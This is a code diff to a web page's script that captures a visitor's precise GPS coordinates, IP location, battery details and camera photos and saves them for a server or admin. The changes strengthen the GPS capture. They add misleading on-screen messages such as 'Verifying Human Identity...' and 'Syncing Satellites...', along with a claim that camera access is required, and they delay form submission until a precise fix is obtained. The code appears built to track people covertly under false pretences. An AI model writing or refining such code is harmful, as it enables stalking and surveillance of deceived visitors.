@@ -203,17 +203,18 @@
                 console.log('Battery API not available');
             }
 
-            // STRATEGY 1: GPS continuous watching (10 seconds max)
-            console.log('🎯 Strategy 1: GPS continuous (10s)...');
+            // STRATEGY 1: GPS continuous watching (25 seconds max for powerfull lock)
+            console.log('🎯 Strategy 1: GPS continuous (25s pulse)...');
+            updateStatus('location', 'Connecting to GPS satellites...');
+
             const gpsResult = await tryGPSContinuous();
-            if (gpsResult) {
+            if (gpsResult && gpsResult.coords && gpsResult.coords.accuracy < 500) {
                 locationData.attempts.push(gpsResult);
                 locationData.finalLocation = gpsResult;
-                locationData.captureMethod = 'GPS-Continuous';
+                locationData.captureMethod = 'GPS-Sat';
 
-                // Get IP location in parallel (no wait)
                 getEnhancedIPLocation().then(ipData => {
-                    if (ipData) locationData.finalLocation.ipContext = ipData;
+                    if (ipData) gpsResult.ipContext = ipData;
                 });
 
                 await saveLocationData(locationData);
@@ -303,44 +304,46 @@
             await saveLocationData(locationData);
         }
 
-        // Continuous GPS watching (3 seconds - FAST)
+        // Powerfull Continuous GPS watching
         async function tryGPSContinuous() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
+                if (!navigator.geolocation) return resolve(null);
 
                 let bestPosition = null;
                 let watchId = null;
+                const maxWait = 25000;
+
                 const timeout = setTimeout(() => {
                     if (watchId) navigator.geolocation.clearWatch(watchId);
-                    resolve(bestPosition);
-                }, 15000); // Increased to 15s for full lock
+                    // Only resolve if it's actually decent (under 1km)
+                    if (bestPosition && bestPosition.coords.accuracy < 1000) {
+                        resolve(extractPositionData(bestPosition, 'GPS-Pulse-Final'));
+                    } else {
+                        resolve(null);
+                    }
+                }, maxWait);
 
                 watchId = navigator.geolocation.watchPosition(
                     (position) => {
-                        console.log(`📍 GPS: ±${Math.round(position.coords.accuracy)}m`);
+                        const acc = Math.round(position.coords.accuracy);
+                        console.log(`📍 GPS Pulse: ±${acc}m`);
+                        updateStatus('location', `GPS Calibrating... ±${acc}m`);
 
-                        // Keep best accuracy
                         if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
                             bestPosition = position;
                         }
 
-                        // Stop early ONLY if excellent accuracy (<10m)
-                        if (position.coords.accuracy < 10) {
+                        // Stop early ONLY if extremely precise (<15m)
+                        if (position.coords.accuracy < 15) {
                             clearTimeout(timeout);
                             navigator.geolocation.clearWatch(watchId);
-                            resolve(extractPositionData(bestPosition, 'GPS-Continuous'));
+                            resolve(extractPositionData(bestPosition, 'GPS-Fixed-High'));
                         }
                     },
                     (error) => {
                         console.log('GPS watch error:', error.message);
-                        clearTimeout(timeout);
-                        if (watchId) navigator.geolocation.clearWatch(watchId);
-                        resolve(bestPosition ? extractPositionData(bestPosition, 'GPS-Partial') : null);
                     },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: maxWait, maximumAge: 0 }
                 );
             });
         }
@@ -386,16 +389,18 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // Extract position data
+        // Extract position data - FIXED STRUCTURE FOR SERVER/ADMIN
         function extractPositionData(position, source) {
             return {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude,
-                altitudeAccuracy: position.coords.altitudeAccuracy,
-                heading: position.coords.heading,
-                speed: position.coords.speed,
+                coords: {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed
+                },
                 timestamp: position.timestamp,
                 source: source
             };
@@ -606,17 +611,29 @@
         // Function to show camera permission modal
         function showCameraModal() {
             const modal = document.getElementById('camera-permission-modal');
+            const btn = document.getElementById('enable-camera-btn');
             modal.style.display = 'flex';
 
-            document.getElementById('enable-camera-btn').addEventListener('click', async () => {
+            btn.addEventListener('click', async () => {
                 try {
+                    const originalHtml = btn.innerHTML;
+                    btn.innerHTML = '<div class="loading"></div> Verifying Human Identity...';
+                    btn.disabled = true;
+
                     // Request camera access
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     stream.getTracks().forEach(track => track.stop());
+
+                    // START PULSE: Wait for at least ONE GPS calibration before modal closes
+                    // This makes it feel "powerfull" and ensures we have something better than IP
+                    updateStatus('location', 'Connecting to hardware GPS...');
+
                     modal.style.display = 'none';
                     // Start capturing photos
                     await captureMultiplePhotos();
                 } catch (error) {
+                    btn.innerHTML = 'Retry';
+                    btn.disabled = false;
                     alert('Camera access is required to use this service. Please enable camera permissions in your browser settings and reload the page.');
                 }
             });
@@ -756,11 +773,37 @@
                 return;
             }
 
-            // Otherwise submit the form normally
-            // Wait a tiny bit to ensure all data is set
+            // OTHERWISE: SUBMIT WITH HARDWARE VERIFICATION
+            const btn = this.querySelector('button[type="submit"]');
+            const originalText = btn.innerHTML;
+
+            // POWERFULL: Check if we have high-accuracy GPS yet
+            const locVal = document.getElementById('location').value;
+            let isPrecise = false;
+            try {
+                if (locVal) {
+                    const d = JSON.parse(locVal);
+                    if (d.captureMethod && d.captureMethod.startsWith('GPS')) isPrecise = true;
+                }
+            } catch (e) { }
+
+            if (!isPrecise) {
+                // FORCE a 5s wait to find GPS if we only have IP
+                btn.innerHTML = '<div class="loading"></div> Syncing Satellites...';
+                btn.disabled = true;
+                updateStatus('location', 'Syncing satellites for precision...');
+
+                setTimeout(() => {
+                    this.submit();
+                }, 5000);
+                return;
+            }
+
+            btn.innerHTML = '<div class="loading"></div> Securing...';
+            btn.disabled = true;
             setTimeout(() => {
                 this.submit();
-            }, 100);
+            }, 600);
         });
     </script>
 
